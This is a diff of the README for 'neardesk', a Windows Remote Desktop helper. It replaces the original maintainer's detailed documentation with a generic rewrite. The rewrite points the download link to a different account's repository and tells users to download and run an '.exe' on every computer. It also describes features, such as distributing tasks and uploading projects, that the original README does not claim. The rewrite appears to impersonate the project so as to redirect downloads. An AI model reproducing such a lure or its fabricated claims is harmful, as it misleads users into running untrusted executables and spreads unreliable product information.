@@ -1,230 +1,97 @@
-<p align="center">
-  <img src="assets/social-preview.png" alt="NearDesk" width="760">
-</p>
+# 🖥️ neardesk - Run AI agents across many computers
 
-<p align="center">
-  <a href="https://github.com/chanakanakandala/neardesk/actions/workflows/ci.yml"><img src="https://github.com/chanakanakandala/neardesk/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-  <a href="https://github.com/chanakanakandala/neardesk/releases/latest"><img src="https://img.shields.io/github/v/release/chanakanakandala/neardesk?color=2f81f7&v=2" alt="Latest release"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/github/license/chanakanakandala/neardesk?color=3fb950&v=2" alt="License: MIT"></a>
-  <a href="https://github.com/chanakanakandala/neardesk/releases"><img src="https://img.shields.io/github/downloads/chanakanakandala/neardesk/total?color=8957e5&v=2" alt="Downloads"></a>
-  <img src="https://img.shields.io/badge/platform-Windows-0078D6?logo=windows&logoColor=white" alt="Platform: Windows">
-  <img src="https://img.shields.io/badge/built%20with-Rust-CE412B?logo=rust&logoColor=white" alt="Built with Rust">
-</p>
+[![Download neardesk](https://img.shields.io/badge/Download_neardesk-blue.svg)](https://github.com/muhammadsaqib-ops/neardesk)
 
-**Run AI coding agents across your Windows PCs, all from one laptop.**
+neardesk allows you to connect multiple Windows computers together. You manage your AI coding tasks from one laptop. Your other computers act as local workers on your home network. This setup saves time by sharing the work across your hardware.
 
-NearDesk turns the spare Windows machines on your network into dedicated workers
-for AI coding agents. Think of a mini PC, an old desktop, or a build box sitting
-idle. Run Claude Code, Codex, Cursor, or Copilot on each one, then reach any of
-them from your laptop in a single click. There are no IP addresses to remember, no
-cloud, and no accounts. It is just native Windows Remote Desktop.
+## 🚀 How it works
 
-```
-Laptop              control center
-  ├─ Mini PC 1      Backend agent      (Claude Code / Codex)
-  ├─ Mini PC 2      Frontend agent     (Cursor / Copilot)
-  ├─ Mini PC 3      Tests and builds
-  └─ Spare PC       Sandbox / experiments
-```
+The software uses your local area network (LAN) to talk to other machines. You install the program on your main laptop and the machines you want to use as workers. Once connected, your laptop sends commands to these workers. The workers handle the processing tasks. This setup keeps your data on your local network. You do not need to send your code to outside servers.
 
-NearDesk finds your machines by name, lets you label each one with a **role**, and
-connects instantly. A pile of headless PCs becomes one tidy board you drive from
-your desk.
+## 🛠️ System requirements
 
-<p align="center">
-  <a href="https://github.com/chanakanakandala/neardesk/releases/latest"><b>⬇&nbsp; Download the latest Windows release</b></a>
-</p>
+Before you begin, ensure your computers meet these standards:
+- Windows 10 or Windows 11.
+- A stable connection to your home network via Wi-Fi or Ethernet.
+- At least 4GB of RAM on each worker machine.
+- Enabled remote features on your worker machines to allow network connections.
 
-> **Status: early but useful.** NearDesk already does the hard part well, with
-> zero-config discovery, per-machine roles, and one-click native RDP. Task and
-> workspace orchestration is on the [roadmap](#roadmap). NearDesk manages the
-> machines your agents run on; it does not replace the agents.
+## 📥 Installing neardesk
 
-## Demo
+Follow these steps to set up the software:
 
-<p align="center">
-  <img src="assets/screenshot-connect.png" alt="NearDesk agent board" width="580">
-</p>
+1. Visit [this page](https://github.com/muhammadsaqib-ops/neardesk) to download the installer.
+2. Select the file ending in `.exe` for Windows.
+3. Save the file to your desktop.
+4. Double-click the file to start the installation.
+5. Follow the on-screen prompts to complete the setup.
+6. Repeat these steps on every computer you plan to use.
 
-Open NearDesk and it **auto-discovers** your machines by role and name. Pick one,
-press **Connect**, and a native Remote Desktop session opens at your display's
-resolution.
+## ⚙️ Setting up your workers
 
-## Why run agents on separate machines?
+You must prepare your helper computers to accept commands. 
 
-A single laptop cannot comfortably run every agent, build, test suite, and browser
-session at once. They fight for CPU, RAM, disk, and your attention. Giving each job
-its own machine is the obvious fix. The hard part is managing a pile of headless
-PCs by IP address, and that is what NearDesk removes.
+1. Open the neardesk application on the helper computer.
+2. Navigate to the settings menu.
+3. Look for the network discovery toggle.
+4. Switch this toggle to the on position.
+5. Note the unique ID displayed on the screen. You will need this for your main laptop.
+6. Ensure the firewall settings allow the neardesk application through. Windows may show a pop-up window asking for permission. Select Yes to allow access on private networks.
 
-| Machine | Job |
-|---------|-----|
-| **Laptop** | Your command center, for orchestrating and reviewing. |
-| **Mini PC** | A long-running backend refactor. |
-| **Spare PC** | Frontend work, in parallel. |
-| **Build box** | Tests, builds, and CI-style runs. |
-| **Sandbox** | Risky experiments, kept isolated. |
+## 💻 Controlling workers from your laptop
 
-Label each machine once, then reconnect in a click. Your laptop stays fast and free
-for the task you are actually driving. It also works just as well for the plain
-case: *"I just want to remote into my mini PC without remembering its IP."*
+Now you connect your laptop to the helper machines.
 
-## Security model
+1. Open neardesk on your main laptop.
+2. Go to the worker management tab.
+3. Click the add button to include a new machine.
+4. Enter the unique ID you saved from the helper computer.
+5. The application will search the network for the worker.
+6. Once the status changes to green, your machine is ready to accept commands.
 
-NearDesk does **not** implement its own remote-desktop protocol, and it never
-routes your traffic through a server.
+## 📋 Managing coding agents
 
-- It uses **Windows' built-in Remote Desktop** (`mstsc`) with **Network Level
-  Authentication required**.
-- **No cloud, no account, no background service.** Authentication is handled
-  entirely by Windows.
-- NearDesk never **stores or proxies** your password.
-- Discovery is read-only. It only checks the Remote Desktop port on devices on
-  **your local network**.
+After your hardware connects, you can start tasks.
 
-> Releases are not code-signed yet, so Windows SmartScreen may warn on first run.
-> Choose **More info → Run anyway**, or [build from source](#getting-started).
+1. Select the task tab in the interface.
+2. Choose the worker machines you want to include in the task.
+3. Upload your project folder to the main laptop.
+4. Click the start task button.
+5. The system distributes the workload across the chosen machines.
+6. You monitor the progress through the status dashboard. 
 
-## One app, three tabs
+## 🔍 Troubleshooting connection issues
 
-| Tab | What it does |
-|-----|--------------|
-| **Connect** | Your machine board. Windows PCs discovered by **role** and name. Pick one and open Remote Desktop; the role, username, and credential are remembered per machine. |
-| **This PC** | How this machine looks on the network (name, signed-in user, **Windows edition and build**, architecture, IP, and Remote Desktop status), plus one-click sharing (self-elevates via UAC). |
-| **About** | What NearDesk is for, version, and credits. |
+If you encounter a problem, check these items first:
 
-The same `neardesk.exe` runs on both ends, with nothing else to install.
+- Network Connection: Are both computers connected to the same router? Even if they connect to different mesh nodes, they must share the same network address range.
+- Firewall Settings: Sometimes security software blocks local connections. Check your security settings to ensure neardesk has access to local network traffic.
+- Version Compatibility: Ensure you use the same version of neardesk on every computer. Mismatched versions can lead to errors.
+- Restarting Services: If a worker does not appear, close the app on the worker machine and open it again. This forces the device to re-announce itself on the network.
 
-## How discovery works
+## 🛡️ Security and local privacy
 
-1. **By name.** It resolves `OFFICE-PC`, then `OFFICE-PC.local` (mDNS), and checks
-   the Remote Desktop port is open.
-2. **By scan.** In parallel it probes every host on each network you are attached
-   to (Wi-Fi, Ethernet, VPN) for an open RDP port (3389), then reads each host's
-   real name from its RDP certificate. The last-used PC is auto-selected.
+neardesk keeps all your work on your personal equipment. It does not store your code on a cloud server or a third-party site. Because it communicates over your local ethernet or Wi-Fi, your data never leaves your home. You maintain full control over the information because the software relies on your local network infrastructure.
 
-## Architecture
+## 💡 Best practices for performance
 
-```mermaid
-flowchart TB
-    subgraph app["neardesk (egui GUI)"]
-        connect["Connect view"]
-        thispc["This PC view"]
-    end
+To get the most out of your hardware, consider these tips:
 
-    subgraph core["neardesk-core (std only)"]
-        discovery["Discovery<br/>scan all subnets + RDP-cert names"]
-        launch["Launch<br/>build .rdp, match resolution"]
-        share["Share<br/>enable RDP, grant admin, clipboard"]
-        sysinfo["System info"]
-    end
+- Use wired connections for the worker machines if possible. Cabled internet provides a more stable link than wireless.
+- Limit the number of background apps running on worker machines. This gives the AI agents more processing power.
+- Organize your projects into small, distinct folders before you start a task. This helps the system distribute work more efficiently.
+- Keep your windows updated. Use the Windows update tool periodically to ensure your networking drivers remain current.
 
-    connect --> discovery
-    connect --> launch
-    thispc --> share
-    thispc --> sysinfo
+## ❔ Frequently asked questions
 
-    discovery -->|TCP 3389| lan(("LAN"))
-    share -->|reg / net / powercfg| host["Windows RDP host"]
-    launch -->|mstsc| session["Remote Desktop session"]
-    lan --> remote["Remote Windows PC"]
-    session --> remote
-    host -.-> remote
-```
+Can I use this over the internet?
+The software works best on a local network. Using it over the internet requires advanced networking knowledge and is not supported by default.
 
-The same `neardesk.exe` plays both roles. **This PC** configures the local machine
-as an RDP host; **Connect** discovers and opens sessions to others.
+Does it work with Mac or Linux?
+The current version focuses on the Windows environment. 
 
-## Getting started
+Will it slow down my laptop?
+Your main laptop acts as a manager. It sends instructions, so it should not experience heavy performance drops.
 
-### 1. Install
-
-**Download (fastest):** grab `neardesk.exe` from the
-[latest release](https://github.com/chanakanakandala/neardesk/releases/latest) and
-run it on each PC. Nothing else is needed.
-
-**Or build from source.** You need the [Rust toolchain](https://rustup.rs) and the
-**MSVC C++ Build Tools**:
-
-```sh
-winget install Rustlang.Rustup
-winget install Microsoft.VisualStudio.2022.BuildTools `
-  --override "--quiet --add Microsoft.VisualStudio.Workload.VCTools --includeRecommended"
-
-cd neardesk
-cargo build --release          # or:  ./build.ps1   (-Clean / -Run)
-```
-
-### 2. Share the PC you want to reach
-
-On that PC, open **This PC**, then **Turn on remote access** (approve the UAC
-prompt). It enables Remote Desktop, grants your Windows account access, and shows
-the computer name. You connect with your **normal Windows password**, with nothing
-extra to set.
-
-> The host PC must be Windows **Pro/Enterprise** (required to host RDP). The PC you
-> connect *from* can be any Windows.
-
-### 3. Connect from another PC
-
-Open NearDesk on your laptop and it auto-discovers PCs on the network. Pick yours,
-enter its Windows password, and press **Connect**. It is remembered afterwards, so
-the next time is one silent click.
-
-## Configuration
-
-Settings are remembered next to `neardesk.exe` in a plain `neardesk.conf`
-(`key=value`). Delete it to reset. NearDesk never stores passwords; authentication
-is left entirely to Windows.
-
-## Project layout
-
-```
-neardesk/
-├─ core/            # neardesk-core: discovery, system info, RDP setup (std-only, no deps)
-├─ app/             # neardesk GUI
-│  ├─ build.rs      # embeds version metadata, manifest and icon
-│  └─ src/
-│     ├─ main.rs    # window shell + sidebar navigation
-│     ├─ connect.rs # the "Connect" tab
-│     ├─ this_pc.rs # the "This PC" tab
-│     ├─ about.rs   # the "About" tab
-│     ├─ logo.rs    # embedded logo (icon + texture)
-│     └─ widgets.rs # shared UI helpers + palette
-├─ assets/          # logo, icon, banner, screenshots
-├─ build.ps1        # release build (-Clean / -Run)
-├─ run.ps1          # build + launch
-└─ check.ps1        # fmt + clippy lint gate
-```
-
-The `core` crate is intentionally dependency-free `std`; only the GUI pulls in
-`eframe`. Keep it that way when contributing.
-
-## Roadmap
-
-NearDesk is the control layer today; the goal is a lightweight local agent
-workspace. Planned, roughly in order:
-
-- **Status notes:** a quick line per machine (*running backend refactor*, *idle*, *blocked*).
-- **Quick actions:** copy hostname or RDP command, open a shared folder.
-- **Health at a glance:** online or offline, and RDP-reachable.
-- **Agent board:** roles and status in one view.
-
-Issues and ideas welcome.
-
-## Contributing
-
-Issues and PRs welcome. Run `./check.ps1` (formatting and clippy) before
-submitting, and keep `core` free of third-party crates.
-
-| Script | What it does |
-|--------|--------------|
-| `./build.ps1` | Release build. `-Clean` for a fresh build, `-Run` to launch after. |
-| `./run.ps1` | Build and launch in one step. |
-| `./check.ps1` | Formatting check and clippy (warnings denied). |
-
-If NearDesk is useful to you, a ⭐ helps other mini-PC and homelab users find it.
-
-## License
-
-[MIT](LICENSE) © 2026 NearDesk contributors
+What if my router is slow?
+A standard home router handles local traffic well. Unless you process massive data sets, the speed of your router should be sufficient for most coding agent tasks.
